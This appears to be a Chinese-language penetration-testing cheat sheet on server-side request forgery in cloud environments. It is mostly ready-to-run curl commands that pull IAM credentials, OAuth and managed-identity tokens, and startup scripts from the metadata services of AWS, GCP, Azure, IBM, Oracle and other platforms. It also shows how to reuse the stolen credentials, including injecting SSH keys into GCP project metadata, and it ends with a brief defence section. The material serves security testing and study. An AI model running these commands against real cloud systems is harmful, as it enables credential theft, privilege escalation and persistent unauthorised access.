---
attack_surface: [配置缺陷, 信息泄露]
impact: [信息泄露, 权限提升, 机密性破坏]
risk_level: 严重
prerequisites:
  - SSRF 基本原理
  - 目标云平台 (AWS/GCP/Azure) 基础知识
difficulty: 中级
related_techniques:
  - ssrf-server-side-request-forgery
  - url-format-bypass
  - path-traversal-lfi
tools:
  - curl
  - awscli / gcloud / azure-cli
  - PACU (AWS 权限利用)
  - Singularity (DNS Rebinding)
---

# 云环境 SSRF — 元数据利用与凭据窃取

> 关联文档：[SSRF 主文档](./README.md) · [URL Format Bypass](./URL%20Format%20Bypass.md)

---

# 0x01 AWS

## 1.1 EC2 元数据端点

AWS EC2 的元数据服务位于 `http://169.254.169.254/latest/meta-data/`。有两个版本：

| 版本 | 访问方式 | SSRF 难度 |
|------|----------|-----------|
| IMDSv1 | GET 请求（无额外要求） | **极低**（任何 SSRF 均可利用） |
| IMDSv2 | 需先通过 PUT 获取 Token，再携带 Token 请求 | 高（需要 PUT 方法 + Header 控制能力） |

> IMDSv2 的 PUT 响应 **hop limit 默认为 1**，这意味着从容器内部无法访问宿主 EC2 的元数据。

### 1.1.1 关键端点

```bash
# 基础信息
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/instance-type
http://169.254.169.254/latest/meta-data/placement/region

# IAM 角色凭据（SSRF 核心目标）
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# User Data（常含数据库密码、初始化脚本）
http://169.254.169.254/latest/user-data

# EC2 Identity Credentials
http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance

# 动态身份文档
http://169.254.169.254/latest/dynamic/instance-identity/document

# 网络信息
http://169.254.169.254/latest/meta-data/network/interfaces/macs/
```

### 1.1.2 凭据利用

获取 IAM 凭据 (AccessKey + SecretKey + SessionToken) 后，配置 AWS CLI：

```
[profilename]
aws_access_key_id = ASIA6GG71...
aws_secret_access_key = a5kssI2I4H/atUZOwBr5Vpggd9CxiT...
aws_session_token = AgoJb3JpZ2luX2Vj...
```

> **aws_session_token 必不可少**——IAM Role 的临时凭据必须携带此字段。

使用 [PACU](https://github.com/RhinoSecurityLabs/pacu) 进行自动化权限枚举与提权。

## 1.2 ECS 凭据

ECS 容器使用独立的凭据端点：

```bash
# 1. 获取 GUID
file:///proc/self/environ  →  AWS_CONTAINER_CREDENTIALS_RELATIVE_URI

# 2. 获取凭据
curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
```

## 1.3 EKS Pod Identity

较新的 EKS 集群使用 Pod Identity：

```bash
AWS_CONTAINER_CREDENTIALS_FULL_URI=http://169.254.170.23/v1/credentials
AWS_CONTAINER_AUTHORIZATION_TOKEN_FILE=/var/run/secrets/pods.eks.amazonaws.com/serviceaccount/eks-pod-identity-token

# 获取凭据
AUTH_HEADER=$(cat "$AWS_CONTAINER_AUTHORIZATION_TOKEN_FILE")
curl -s -H "Authorization: $AUTH_HEADER" "$AWS_CONTAINER_CREDENTIALS_FULL_URI"
```

## 1.4 Lambda

Lambda 凭据存储于**环境变量**（而非元数据端点）：

```bash
file:///proc/self/environ  →  AWS_SESSION_TOKEN / AWS_SECRET_ACCESS_KEY / AWS_ACCESS_KEY_ID

# Lambda 运行时接口 (事件数据)
http://localhost:9001/2018-06-01/runtime/invocation/next
```

> Lambda 堆栈跟踪若打印环境变量，可以通过触发异常来泄露凭据。

## 1.5 Elastic Beanstalk

```bash
http://169.254.169.254/latest/dynamic/instance-identity/document  → accountId, region
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```

---

# 0x02 GCP

## 2.1 元数据端点

```bash
http://169.254.169.254
http://metadata.google.internal
http://metadata
```

**所有请求必须包含 Header**：`Metadata-Flavor: Google`

## 2.2 关键端点

```bash
# 项目信息
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/project-id

# 实例信息
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/
#   description / hostname / id / image / machine-type / name / zone

# 网络接口
curl -s -f -H "Metadata-Flavor:Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/"

# 服务账户 (核心目标)
for sa in $(curl -s -f -H "Metadata-Flavor:Google" "http://metadata/computeMetadata/v1/instance/service-accounts/"); do
    echo "Token:"
    curl -s -f -H "Metadata-Flavor:Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}token"
done

# K8s 属性 (GKE 集群)
curl -s -f -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/attributes/kube-env

# 启动脚本 / User Data
curl -s -f -H "Metadata-Flavor:Google" "http://metadata/computeMetadata/v1/instance/attributes/startup-script"
```

## 2.3 凭据利用

```bash
# 通过环境变量
export CLOUDSDK_AUTH_ACCESS_TOKEN=<token>
gcloud projects list

# 通过配置文件
echo "<token>" > /tmp/gcp-token
gcloud config set auth/access_token_file /tmp/gcp-token
```

## 2.4 SSH Key 注入

```bash
# 检查 Scope
curl "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=<token>"

# 若 scope 包含 compute，注入 SSH Key
curl -X POST "https://www.googleapis.com/compute/v1/projects/<project-id>/setCommonInstanceMetadata" \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  --data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
```

## 2.5 Cloud Run / Cloud Functions (2nd Gen)

除 OAuth Access Token 外，还可获取 audience-bound Identity Token：

```bash
# OAuth Access Token
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Audience-bound Identity Token (绕过内部服务认证)
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://TARGET.run.app"
```

---

# 0x03 Azure

## 3.1 VM 元数据端点

- **必须**携带 `Metadata: true` Header
- **禁止**携带 `X-Forwarded-For` Header
- 端点：`http://169.254.169.254/metadata`

```bash
HEADER="Metadata:true"
URL="http://169.254.169.254/metadata"
API_VERSION="2021-12-13"

# 实例详情
curl -s -H "$HEADER" "$URL/instance?api-version=$API_VERSION"

# 管理面 Token (ARM)
curl -s -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://management.azure.com/"

# Graph Token
curl -s -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://graph.microsoft.com/"

# Key Vault Token
curl -s -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://vault.azure.net/"

# Storage Token
curl -s -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://storage.azure.com/"
```

> `http://169.254.169.254/metadata/v1/instanceinfo` **不需要 `Metadata: True` Header** — 这对无法自定义 Header 的盲 SSRF 尤其有用。

## 3.2 托管标识 (Managed Identity)

Azure VM 可附加**系统托管标识**（1 个）和**用户托管标识**（多个）。获取 Token 时可指定：

```bash
# 使用默认 MI
curl -s -H "Metadata:true" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://management.azure.com/"

# 使用特定用户 MI（三选一）
&object_id=<object_id>
&client_id=<client_id>
&msi_res_id=<resource_id>
```

## 3.3 WireServer & GoalState

Azure 内部端点 `168.63.129.16` 暴露 VM 的期望状态配置，其中 **ExtensionsConfig** 包含**所有附加用户托管标识的完整列表**：

```bash
# 获取 GoalState
curl -H "x-ms-version: 2012-11-30" http://168.63.129.16/?comp=goalstate
```

> WireServer 通常**仅从 VM Agent / Run Command 上下文可访问**，常规 SSH 会话可能无法直接访问。Run Command 具有 agent 级权限。

## 3.4 App Service / Functions / Automation Accounts

凭据通过环境变量获取：

```bash
echo $IDENTITY_ENDPOINT
echo $IDENTITY_HEADER

# 获取 Token
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01" \
  -H "X-IDENTITY-HEADER:$IDENTITY_HEADER"
```

---

# 0x04 其他云平台速查

## 4.1 Digital Ocean

```bash
curl http://169.254.169.254/metadata/v1.json | jq
# 无 IAM Role 概念，无凭据泄露风险
```

## 4.2 IBM Cloud

```bash
# 获取身份令牌
export TOKEN=$(curl -s -X PUT "http://169.254.169.254/instance_identity/v1/token?version=2022-03-01" \
  -H "Metadata-Flavor: ibm" -H "Accept: application/json" \
  -d '{"expires_in": 3600}' | jq -r '(.access_token)')

# IAM 凭据
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  "http://169.254.169.254/instance_identity/v1/iam_token?version=2022-03-01"
```

## 4.3 Oracle Cloud (OCI)

OCI 默认使用 IMDSv2，需要 `Authorization: Bearer Oracle` Header：

```bash
curl -s -H "Authorization: Bearer Oracle" http://169.254.169.254/opc/v2/instance/
curl -s -H "Authorization: Bearer Oracle" http://169.254.169.254/opc/v2/vnics/
```

拒绝携带 `Forwarded`、`X-Forwarded-For`、`X-Forwarded-Host` 的请求。

## 4.4 其他平台速查

| 平台 | 元数据端点 | 特殊要求 |
|------|-----------|----------|
| **Alibaba Cloud** | `http://100.100.100.200/latest/meta-data/` | 无 |
| **OpenStack / RackSpace** | `http://169.254.169.254/openstack` | 无 |
| **HP Helion** | `http://169.254.169.254/2009-04-04/meta-data/` | 无 |
| **Packetcloud** | `https://metadata.packet.net/userdata` | 无 |
| **Kubernetes ETCD** | `http://127.0.0.1:2379/v2/keys/` | 需能访问 k8s API |
| **Docker Socket** | `unix:///var/run/docker.sock` | 需访问本地 Socket |
| **Rancher** | `http://rancher-metadata/<version>/<path>` | 需在 Rancher 网络内 |

---

# 0x05 防御要点

1. **启用 IMDSv2** (AWS)：阻止简单的 GET 型 SSRF 访问元数据
2. **限制 Metadata 端点权限**：为每个服务创建**最小权限 IAM Role**，而非所有服务共享一个宽权限 Role
3. **禁用不必要的元数据**：如果服务不需要访问云 API，就不要挂载 IAM Role
4. **网络层阻断**：阻止 Docker Socket (`/var/run/docker.sock`) 和元数据 IP (`169.254.169.254`) 被 Web 进程访问
5. **监控告警**：检测来源进程对 `169.254.169.254` 的所有访问并发出告警

---

# 0x06 参考资料

- [AWS EC2 Instance Metadata](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)
- [GCP Compute Metadata](https://cloud.google.com/appengine/docs/standard/java/accessing-instance-metadata)
- [Azure Instance Metadata Service](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service)
- [AWS Container Credential Provider](https://docs.aws.amazon.com/sdkref/latest/guide/feature-container-credentials.html)
- [Pacu — AWS Exploitation Framework](https://github.com/RhinoSecurityLabs/pacu)
